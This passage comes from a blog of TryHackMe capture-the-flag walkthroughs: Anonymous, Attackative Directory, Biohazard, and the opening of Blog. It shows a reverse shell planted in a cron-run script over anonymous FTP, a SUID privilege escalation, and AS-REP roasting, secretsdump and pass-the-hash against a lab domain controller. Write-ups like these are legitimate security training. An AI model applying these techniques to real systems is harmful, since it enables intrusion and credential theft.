challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-05-07T10:15:43 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 35.53 seconds Im not going to touch port 22 because ssh is cute. Port 21 is ftp allowing anon login.\n1.2 FTP ┌──(kali㉿kali)-[/tmp] └─$ ftp 10.10.14.90 Connected to 10.10.14.90. 220 NamelessOne's FTP Server! Name (10.10.14.90:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts 226 Directory send OK. ftp\u0026gt; cd scripts 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rwxr-xrwx 1 1000 1000 314 Jun 04 2020 clean.sh -rw-rw-r-- 1 1000 1000 946 May 07 10:11 removed_files.log -rw-r--r-- 1 1000 1000 68 May 12 2020 to_do.txt 226 Directory send OK. ftp\u0026gt; get clean.sh local: clean.sh remote: clean.sh 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for clean.sh (314 bytes). 226 Transfer complete. 314 bytes received in 0.00 secs (1.3612 MB/s) ftp\u0026gt; get removed_files.log local: removed_files.log remote: removed_files.log 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for removed_files.log (989 bytes). 226 Transfer complete. 989 bytes received in 0.00 secs (11.2284 MB/s) ftp\u0026gt; get to_do.txt local: to_do.txt remote: to_do.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for to_do.txt (68 bytes). 226 Transfer complete. 68 bytes received in 0.08 secs (0.8479 kB/s) ftp\u0026gt; 221 Goodbye. Okay, let\u0026rsquo;s explore them one by one.\n1.3 Exploration ┌──(kali㉿kali)-[/tmp] └─$ cat clean.sh 1 ⨯ #!/bin/bash tmp_files=0 echo $tmp_files if [ $tmp_files=0 ] then echo \u0026quot;Running cleanup script: nothing to delete\u0026quot; \u0026gt;\u0026gt; /var/ftp/scripts/removed_files.log else for LINE in $tmp_files; do rm -rf /tmp/$LINE \u0026amp;\u0026amp; echo \u0026quot;$(date) | Removed file /tmp/$LINE\u0026quot; \u0026gt;\u0026gt; /var/ftp/scripts/removed_files.log;done fi ┌──(kali㉿kali)-[/tmp] └─$ cat removed_files.log Running cleanup script: nothing to delete Running cleanup script: nothing to delete Running cleanup script: nothing to delete Running cleanup script: nothing to delete Interesting \u0026hellip; This looks like it has the scope for priv esc later on. I ll have to dig in, but we\u0026rsquo;ll keep this in mind.\n┌──(kali㉿kali)-[/tmp] └─$ cat to_do.txt I really need to disable the anonymous login...it's really not safe lmao ikr.\nOkay. So, one thing that the other questions hint at, is the smb shares on port 139 and 445. Let\u0026rsquo;s explore that.\n1.4 SMB  ┌──(kali㉿kali)-[~] └─$ smbclient -L 10.10.14.90 -N Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers pics Disk My SMB Share Directory for Pics IPC$ IPC IPC Service (anonymous server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available  -L btw is for listing the shares -N is for saying im not giving a password :)  ┌──(kali㉿kali)-[~] └─$ smbclient //10.10.14.90/pics -N Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sun May 17 07:11:34 2020 .. D 0 Wed May 13 21:59:10 2020 corgo2.jpg N 42663 Mon May 11 20:43:42 2020 puppos.jpeg N 265188 Mon May 11 20:43:42 2020 20508240 blocks of size 1024. 13306808 blocks available smb: \\\u0026gt; Since there are no other active pathways available (other than clean.sh :P), we have the devil in front of us \u0026hellip; stego.\nWell well well. Imma brb with some tools.\nSo, \u0026hellip; I have been trolled. Nothing in images. \u0026ldquo;My disappointment is immeasurable and my day is ruined\u0026rdquo;.\n2. Foothold Okay. That clean.sh script looked tasty, let\u0026rsquo;s break it down.\n#!/bin/bash tmp_files=0 echo $tmp_files if [ $tmp_files=0 ] then echo \u0026quot;Running cleanup script: nothing to delete\u0026quot; \u0026gt;\u0026gt; /var/ftp/scripts/removed_files.log else for LINE in $tmp_files; do rm -rf /tmp/$LINE \u0026amp;\u0026amp; echo \u0026quot;$(date) | Removed file /tmp/$LINE\u0026quot; \u0026gt;\u0026gt; /var/ftp/scripts/removed_files.log;done fi Okay. Nothing in here specifically, but the existence of logs tells me that it is being run quite frequently. This means \u0026hellip; its revshell time :D\nsh -i \u0026gt;\u0026amp; /dev/tcp/YO_IP/1337 0\u0026gt;\u0026amp;1\nSince we have all the permissions, its ezpzlmnsqz. Lesgoo\n┌──(kali㉿kali)-[/tmp] └─$ ftp 10.10.14.90 Connected to 10.10.14.90. 220 NamelessOne's FTP Server! Name (10.10.14.90:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts 226 Directory send OK. ftp\u0026gt; cd scripts 250 Directory successfully changed. ftp\u0026gt; put clean.sh local: clean.sh remote: clean.sh 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 383 bytes sent in 0.00 secs (4.6235 MB/s) ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rwxr-xrwx 1 1000 1000 383 May 07 10:50 clean.sh -rw-rw-r-- 1 1000 1000 2623 May 07 10:50 removed_files.log -rw-r--r-- 1 1000 1000 68 May 12 2020 to_do.txt 226 Directory send OK. ftp\u0026gt; where the edited script looks like so,\n#!/bin/bash # hehehehehe yeaaa boiiii sh -i \u0026gt;\u0026amp; /dev/tcp/10.8.150.214/1337 0\u0026gt;\u0026amp;1 tmp_files=0 echo $tmp_files if [ $tmp_files=0 ] then echo \u0026quot;Running cleanup script: nothing to delete\u0026quot; \u0026gt;\u0026gt; /var/ftp/scripts/removed_files.log else for LINE in $tmp_files; do rm -rf /tmp/$LINE \u0026amp;\u0026amp; echo \u0026quot;$(date) | Removed file /tmp/$LINE\u0026quot; \u0026gt;\u0026gt; /var/ftp/scripts/removed_files.log;done fi ┌──(kali㉿kali)-[/tmp] └─$ nc -lnvp 1337 listening on [any] 1337 ... connect to [10.8.150.214] from (UNKNOWN) [10.10.14.90] 43642 sh: 0: can't access tty; job control turned off $ whoami namelessone $ id uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd) NOICE. we are in!\n3. PrivEsc okay. first things first. Let\u0026rsquo;s get a better shell and see what sudo permissions we have. Just do bash -i. We get\nnamelessone@anonymous:~$ sudo -l sudo -l sudo: no tty present and no askpass program specified Okay so time to find the setuid bit. Use namelessone@anonymous:~$ find / -perm -u=s 2\u0026gt;/dev/null\nLooking at gtfobins we find env as a possible solution.\nnamelessone@anonymous:~$ /usr/bin/env /bin/bash -p /usr/bin/env /bin/bash -p whoami root cat /root/root.txt {hmmmmmmmmmmmmmmmmm} We are done!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/kd6mc4d.jpg","permalink":"https://chaudhary1337.github.io/p/tryhackme-anonymous-writeup/","title":"TryHackMe: Anonymous Writeup"},{"content":"Play\nPrimer:\n [Video] Active Directory [Video] [Hindi] Kerberos - decent overview [Video] Kerberos - has good visualizations  If this is your first time, as was mine, the above resoruces provide a decent overview of the stuff we are going to deal with.\n1. Deploy Follow the steps!\n2. Install Tools Install and follow the steps listed. Add the below too as well. Check their GitHub for more information\n Kerbrute evilwinrm  3. Enumeration: Basic Scanning Let\u0026rsquo;s kick off things with our nmap scan.\n┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples] └─$ nmap -sC -sV -A 10.10.230.36 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 23:18 EDT Nmap scan report for 10.10.230.36 Host is up (0.20s latency). Not shown: 987 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-05-21 03:19:32Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: THM-AD | NetBIOS_Domain_Name: THM-AD | NetBIOS_Computer_Name: ATTACKTIVEDIREC | DNS_Domain_Name: spookysec.local | DNS_Computer_Name: AttacktiveDirectory.spookysec.local | Product_Version: 10.0.17763 |_ System_Time: 2021-05-21T03:19:46+00:00 | ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local | Not valid before: 2021-05-20T03:01:57 |_Not valid after: 2021-11-19T03:01:57 |_ssl-date: 2021-05-21T03:19:55+00:00; +4s from scanner time. Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 3s, deviation: 0s, median: 3s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-05-21T03:19:46 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 71.38 seconds What tool will allow us to enumerate port 139/445? enum4linux\n Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from www.bindview.com. Source\n NOTE: This tool is mentioned, but never used.\nWhat is the NetBIOS-Domain Name of the machine? Search in the nmap results.\nWhat invalid TLD do people commonly use for their Active Directory Domain? This is a good questions, very interesting answer is present here\n Simply promoting a {xyz.mmm_secure_extension} domain will not secure your domain and you will have a false sense of security that your Active Directory is safe.\n 4. Enumeration: Kerberos Using the tool kerbrute.\n This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication. It is designed to be used on an internal Windows domain with access to one of the Domain Controllers. Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts\n Let\u0026rsquo;s also add the line 10.10.99.177 spookysec.local (separated by a tab) to the /etc/hosts/ file. It looks like so:\n┌──(kali㉿kali)-[~/Desktop/tools] └─$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali 10.10.99.177 spookysec.local # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters Run:\n┌──(kali㉿kali)-[~/Desktop/tools] └─$ ./kerbrute userenum --dc spookysec.local -d spookysec.local /tmp/userlist.txt -t 128 __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 05/21/21 - Ronnie Flathers @ropnop 2021/05/21 00:58:04 \u0026gt; Using KDC(s): 2021/05/21 00:58:04 \u0026gt; spookysec.local:88 2021/05/21 00:58:04 \u0026gt; [+] VALID USERNAME: james@spookysec.local ... {truncated ;)} ... 2021/05/21 00:59:57 \u0026gt; [+] VALID USERNAME: ROBIN@spookysec.local 2021/05/21 01:00:38 \u0026gt; Done! Tested 73317 usernames (16 valid) in 154.456 seconds What command within Kerbrute will allow us to enumerate valid usernames? check the -h flag if you are new to any tool.\nWhat notable account is discovered? (These should jump out at you) Admin accounts are always interesting. Let\u0026rsquo;s call it user1 in the rest of the writeup.\nWhat is the other notable account is discovered? (These should jump out at you) Second most delicious account names. Let\u0026rsquo;s call it item2 in the rest of the writeup.\n5. Abusing Kerberos  After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege \u0026ldquo;Does not require Pre-Authentication\u0026rdquo; set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.\n  Impacket has a tool called \u0026ldquo;GetNPUsers.py\u0026rdquo; (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that\u0026rsquo;s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.\n ┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples] └─$ python3 GetNPUsers.py spookysec.local/{user1} -no-pass Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation [*] Getting TGT for {user1} ${hash type}${user1}@SPOOKYSEC.LOCAL:{salt}${here used to be the hash} ┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples] └─$ python3 GetNPUsers.py spookysec.local/{item2} -no-pass Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation [*] Getting TGT for {item2} [-] User {item2} doesn't have UF_DONT_REQUIRE_PREAUTH set So let\u0026rsquo;s go for {user1}. Here\u0026rsquo;s the hashcat documentation.\nUsing hashcat,\n┌──(kali㉿kali)-[/tmp] └─$ hashcat -m {find the mode using the link above} hash passwordlist.txt --force ... ${hash type}${user1}@SPOOKYSEC.LOCAL:{salt}${here used to be the hash}:{password :D :D :D} ... As voila! We have the password for {user1}!\nNOTE: We get the below error, if the --force flag is not there.\n* Device #1: Skipping hash-mode {the mode used} - known CUDA/OpenCL Runtime/Driver issue (not a hashcat issue) You can use --force to override, but do not report related errors. We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password? {user1}\nLooking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name) Again, look at the documentation!\nNow crack the hash with the modified password list provided, what is the user accounts password? {yeee hawwww}\n6. More Enumeration Since we now have the credentials for the {user1}, let us go for smb.\n┌──(kali㉿kali)-[/tmp] └─$ smbclient -L 10.10.99.177 -U spookysec.local/{user1} Enter SPOOKYSEC.LOCAL\\{user1}'s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin backup Disk C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share SMB1 disabled -- no workgroup available None except one really stands out.\n┌──(kali㉿kali)-[/tmp] └─$ smbclient //10.10.99.177/{i wonder which share!} -U spookysec.local/{user1} Enter SPOOKYSEC.LOCAL\\{user1}'s password: Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sat Apr 4 15:08:39 2020 .. D 0 Sat Apr 4 15:08:39 2020 backup_credentials.txt A 48 Sat Apr 4 15:08:53 2020 8247551 blocks of size 4096. 3630842 blocks available smb: \\\u0026gt; get backup_credentials.txt getting file \\backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) As its too easy!\n┌──(kali㉿kali)-[/tmp] └─$ cat backup_credentials.txt {looks like a decoded string ... I wonder which method was used to encode} Using CyberChef, {item2}@spookysec.local:{another password!}\n7. Domain Priv-Esc ┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples] └─$ python3 secretsdump.py spookysec.local/{item2}:{yeee hawww}@10.10.99.177 Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets {there were a lot of hashes here. Removed because they were taking too much space ;) } [*] Cleaning up... What method allowed us to dump NTDS.DIT? Check the output of the script we ran. Usually, interesting information is given in a line, starting with [*]\nWhat is the Administrators NTLM hash? Same as above. Use the dumps first line and use the structure mentioned in the info line.\nWhat method of attack could allow us to authenticate as the user without the password? pass the hash\nWe can apparently directly send the hash to auth, instead of first cracking it. Quite convenient, aye!\nUsing a tool called Evil-WinRM what option will allow us to use a hash? When in doubt, always check the -h command!\n┌──(kali㉿kali)-[~/Desktop/tools] └─$ evil-winrm -i 10.10.99.177 -u administrator {nice flag here} {admin's NLTM hash} Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; And we are in :stonks:\n*Evil-WinRM* PS C:\\Users\u0026gt; ls Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/17/2020 4:04 PM a-spooks d----- 9/17/2020 4:02 PM Administrator d----- 4/4/2020 12:19 PM {item2} d----- 4/4/2020 1:07 PM backup.THM-AD d-r--- 4/4/2020 11:19 AM Public d----- 4/4/2020 12:18 PM {user1} GG room, very fun. Lots to learn!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/4WSAwTY.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-attackative-directory-writeup/","title":"TryHackMe: Attackative Directory Writeup"},{"content":"Play\n1. Introduction We start with nmap for port scanning and do some web exploration meanwhile.\n1.1. Port Scanning ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV -A 10.10.111.73 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 00:26 EDT Nmap scan report for 10.10.111.73 Host is up (0.21s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c9:03:aa:aa:ea:a9:f1:f4:09:79:c0:47:41:16:f1:9b (RSA) | 256 2e:1d:83:11:65:03:b4:78:e9:6d:94:d1:3b:db:f4:d6 (ECDSA) |_ 256 91:3d:e4:4f:ab:aa:e2:9e:44:af:d3:57:86:70:bc:39 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Beginning of the end Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 54.24 seconds 1.2. Web Exploration On the main page, we get two things:\n /image/ directory /mansionmain web page  The image directory shows with an interesting file: zombie. We\u0026rsquo;ll keep that in mind. Let\u0026rsquo;s go to the mansion page\nMansion Room The /mansionmain page source has another link as\n\t\u0026lt;!-- It is in the /diningRoom/ --\u0026gt; Going there, we see\n \u0026lt;!-- SG93IGFib3V0IHRoZSAvdGVhUm9***** --\u0026gt; Is what we see in the source, along with a link to a file, that gives us the emblem flag.\nThis we can put in the slot.\nWe are redirected to this page,\nLooks like one dead end. So, let\u0026rsquo;s go back to the encoded string we saw in the comments in the dining room page. Using Cyber Chef we get How about the /teaRoom/. Let\u0026rsquo;s go there.\nTea Room In the teaRoom, we get\n Barry also suggested that Jill should visit the /artRoom/ a link to /teaRoom/master_of_******.html  The second one shows us a flag! Just to be safe, I checked if I missed some thing in the source code. Nothing there. Onto the art room!\nArt Room We see a map, of which we already have covered some. Let\u0026rsquo;s start with the barRoom\nBar Room We already have the flag with us.\nWe see the READ link, which gives us another code that needs to be broken. Using our best friend Cyber Chef we get the music sheet flag!\nPutting this in, we get the golden emblem. Now, we put this in the emblem slot in the dining room. We get\nklfvg ks r wimgnd biz mpuiui ulg fiemok tqod. Xii jvmc tbkg ks tempgf tyi_hvgct_jljinf_kvc\nI tried rot13 and CyberChef, but they didn\u0026rsquo;t work. Anohter common way to ciphers is Vigenere Cipher, so I used this tool to auto-decode without a key.\nWe get the key after a lot of guesswork.\nPS: Do try this yourself, because a similar pattern is found later.\nLet\u0026rsquo;s move to another room.\nDining Room 2F (Second Floor) We see another code hidden in source-code. This time however, it does not look encoded. Instead, the length and the spaces tell me its a ROT version. ROT13 being the most common one, Let\u0026rsquo;s try it!\nUsing ROT13 we get\n\t\u0026lt;!-- You get the blue gem by pushing the status to the lower floor. The gem is on the diningRoom first floor. Visit ********.html --\u0026gt; And doing this, we get another flag!\nLet\u0026rsquo;s move to tiger room.\nTiger Status Room We get the blue gem flag, and input it here. Also, if I do not mention about the source code comments or some shady stuff, its because it is not there.\nAnyways, we get\ncrest 1: {key was here} Hint 1: Crest 1 has been encoded twice Hint 2: Crest 1 contanis 14 letters Note: You need to collect all 4 crests, combine and decode to reavel another path The combination should be crest 1 + crest 2 + crest 3 + crest 4. Also, the combination is a type of encoded base and you need to decode it We\u0026rsquo;ll come back to it then.\nGallery Room We see another similar story, the note linked in this page reads the crest 2.\ncrest 2: {key was here} Hint 1: Crest 2 has been encoded twice Hint 2: Crest 2 contanis 18 letters Note: You need to collect all 4 crests, combine and decode to reavel another path The combination should be crest 1 + crest 2 + crest 3 + crest 4. Also, the combination is a type of encoded base and you need to decode it Let\u0026rsquo;s keep going. We have study room, armour room and attic. Last two ask for a shield and study asks for a helmet. We start with attic then.\nAttic We find crest 4 here\ncrest 4: {key was here} Hint 1: Crest 2 has been encoded twice Hint 2: Crest 2 contanis 17 characters Note: You need to collect all 4 crests, combine and decode to reavel another path The combination should be crest 1 + crest 2 + crest 3 + crest 4. Also, the combination is a type of encoded base and you need to decode it Armour Room crest 3: {key was here} Hint 1: Crest 3 has been encoded three times Hint 2: Crest 3 contanis 19 letters Note: You need to collect all 4 crests, combine and decode to reavel another path The combination should be crest 1 + crest 2 + crest 3 + crest 4. Also, the combination is a type of encoded base and you need to decode it Making Sense of the Mess We have all the 4 crests, although they do not make any sense right now. One we have each of them decoded, we need to put them together and then decode once more.\nCrest1\nCyberChef to the rescue! We see it has 2 iterations: base64-\u0026gt; base 32.\nCrest2\nSimilarly, from base32 to base58.\nCrest3 Crest4 And we now combine them.\nFTP user: hunter, FTP pass: you_cant_hide_******* Hell yes! We are done with this stuff. Now, onto FTP.\n1.3. FTP ┌──(kali㉿kali)-[/tmp] └─$ ftp 10.10.111.73 Connected to 10.10.111.73. 220 (vsFTPd 3.0.3) Name (10.10.111.73:kali): hunter 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 1002 1002 4096 Sep 20 2019 . drwxrwxrwx 2 1002 1002 4096 Sep 20 2019 .. -rw-r--r-- 1 0 0 7994 Sep 19 2019 001-key.jpg -rw-r--r-- 1 0 0 2210 Sep 19 2019 002-key.jpg -rw-r--r-- 1 0 0 2146 Sep 19 2019 003-key.jpg -rw-r--r-- 1 0 0 121 Sep 19 2019 helmet_key.txt.gpg -rw-r--r-- 1 0 0 170 Sep 20 2019 important.txt 226 Directory send OK. ... ftp\u0026gt; 221 Goodbye. Get all the files. Ez.\n┌──(kali㉿kali)-[/tmp] └─$ cat important.txt Jill, I think the helmet key is inside the text file, but I have no clue on decrypting stuff. Also, I come across a /******_******/ door but it was locked. From, Barry 1.3.1 Steganography ┌──(kali㉿kali)-[/tmp] └─$ steghide --extract --stegofile 001-key.jpg Enter passphrase: wrote extracted data to \u0026quot;key-001.txt\u0026quot;. ┌──(kali㉿kali)-[/tmp] └─$ cat key-001.txt {key was here} ┌──(kali㉿kali)-[/tmp] └─$ binwalk 003-key.jpg -e DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 1930 0x78A Zip archive data, at least v2.0 to extract, uncompressed size: 14, name: key-003.txt 2124 0x84C End of Zip archive, footer length: 22 ┌──(kali㉿kali)-[/tmp] └─$ cd _003-key.jpg.extracted ┌──(kali㉿kali)-[/tmp/_003-key.jpg.extracted] └─$ ls 78A.zip key-003.txt ┌──(kali㉿kali)-[/tmp/_003-key.jpg.extracted] └─$ cat key-003.txt {key was here} ┌──(kali㉿kali)-[/tmp] └─$ strings 002-key.jpg JFIF {key was here} ... \u0026quot;*%%*424DD\\ ... Combine all of them and decode using cyberchef. Then,\n┌──(kali㉿kali)-[/tmp] └─$ gpg helmet_key.txt.gpg gpg: WARNING: no command supplied. Trying to guess what you mean ... gpg: AES256.CFB encrypted data gpg: encrypted with 1 passphrase and we have\n┌──(kali㉿kali)-[/tmp] └─$ cat helmet_key.txt helmet_key{yee_haww} very nice. Back to Web Exploration huh?\n1.4. Web Exploration - Again Going to the closet room, we find two more pieces of information:\n SSH password: *_*****_***** wpbwbxr wpkzg pltwnhro, txrks_xfqsxrd_bvv_fy_******_***  Using this automatic solver as we saw before, we get: weasker login password stars members are my ****** ***\nAlso, recall that the last time, we couldn\u0026rsquo;t epxlore the study room - because it required the helmet key which we didnt have. Exploring that, we get a doom.tar.gz file. Very nice.\n┌──(kali㉿kali)-[/tmp] └─$ tar -xzvf doom.tar.gz eagle_medal.txt ┌──(kali㉿kali)-[/tmp] └─$ cat eagle_medal.txt SSH user: umbrella_guest Ha! Easy!\n2. Foothold Ah. Finally. We are done with the chaos.\n┌──(kali㉿kali)-[/tmp] └─$ ssh umbrella_guest@10.10.111.73 {bla bla bla nothing interezting} umbrella_guest@umbrella_corp:~$ Doing some exploration, we come across:\numbrella_guest@umbrella_corp:/home/weasker$ cat weasker_note.txt Weaker: Finally, you are here, Jill. Jill: Weasker! stop it, You are destroying the mankind. Weasker: Destroying the mankind? How about creating a 'new' mankind. A world, only the strong can survive. Jill: This is insane. Weasker: Let me show you the ultimate lifeform, the {enemy name here}. ({enemy name here} jump out and kill Weasker instantly) (Jill able to stun the tyrant will a few powerful magnum round) Alarm: Warning! warning! Self-detruct sequence has been activated. All personal, please evacuate immediately. (Repeat) Jill: Poor bastard We also find\numbrella_guest@umbrella_corp:~/.jailcell$ cat chris.txt Jill: Chris, is that you? Chris: Jill, you finally come. I was locked in the Jail cell for a while. It seem that weasker is behind all this. Jil, What? Weasker? He is the traitor? Chris: Yes, Jill. Unfortunately, he play us like a damn fiddle. Jill: Let's get out of here first, I have contact brad for helicopter support. Chris: Thanks Jill, here, take this MO Disk 2 with you. It look like the key to deciphers something. Jill: Alright, I will deal with him later. Chris: see ya. MO disk 2: albert 3. Priv-Esc umbrella_guest@umbrella_corp:~$ sudo -l [sudo] password for umbrella_guest: Sorry, user umbrella_guest may not run sudo on umbrella_corp. umbrella_guest@umbrella_corp:~$ file / -type f -perm -u=s 2\u0026gt;/dev/null Both of them return nothing. :(\nHow about the user weasker? Well we have something from before that we didn\u0026rsquo;t use uptill now.\nweasker login password stars members are my ****** ***\nPS: use the same concept as we did for the html page above. And \u0026hellip; we are in!\numbrella_guest@umbrella_corp:/home/weasker$ su weasker Password: weasker@umbrella_corp:~$ weasker@umbrella_corp:~$ sudo -l Matching Defaults entries for weasker on umbrella_corp: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User weasker may run the following commands on umbrella_corp: (ALL : ALL) ALL This is kinda cute. We are done! Such a long room damn. Fun though :D\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/d7dVxxR.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-biohazard-writeup/","title":"TryHackMe: Biohazard Writeup"},{"content":"Play\n1. Recon 1.1 Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV -A 10.10.129.188 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-08 04:01 EDT Nmap scan report for 10.10.129.188 Host is up (0.21s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA) | 256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA) |_ 256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: WordPress 5.0 | http-robots.txt: 1 disallowed entry |_/wp-admin/ |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Billy Joel\u0026amp;#039;s IT Blog \u0026amp;#8211; The IT blog 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 3s, deviation: 0s, median: 2s |_nbstat: NetBIOS name: BLOG, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: blog | NetBIOS computer name: BLOG\\x00 | Domain name: \\x00 | FQDN: blog |_ System time: 2021-05-08T08:02:17+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-05-08T08:02:17 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 65.16 seconds The website seems to be broken, so I read the description. Let\u0026rsquo;s add the ip to the /etc/hosts 